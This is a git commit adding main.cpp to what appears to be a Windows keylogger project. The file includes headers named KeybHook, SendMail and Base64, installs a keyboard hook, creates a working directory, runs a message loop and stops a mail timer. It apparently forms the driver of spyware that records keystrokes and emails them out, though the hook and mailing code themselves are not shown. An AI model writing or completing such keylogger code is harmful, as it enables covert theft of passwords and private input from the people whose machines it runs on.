a7dbc62ecf933bafc4e921e3032dcc810e343655
harshmalhan <40890211+harshmalhan@users.noreply.github.com>
2019-11-06 23:54:39 +0530

    Add files via upload

---
+++ main.cpp
@@ -0,0 +1,27 @@
+#include <iostream>
+#include <windows.h>
+#include "Helper.h"
+#include "keyconstants.h"
+#include "Base64.h"
+#include "IO.h"
+#include "Timer.h"
+#include "SendMail.h"
+#include "KeybHook.h"
+
+using namespace std;
+
+int main()
+{
+    MSG msg;
+    IO::MKDir(IO::GetOurPath(true));
+
+    InstallHook();
+
+    while(GetMessage(&msg, NULL, 0, 0))
+    {
+        TranslateMessage(&msg);
+        DispatchMessage(&msg);
+    }
+    MailTimer.Stop();
+    return 0;
+}
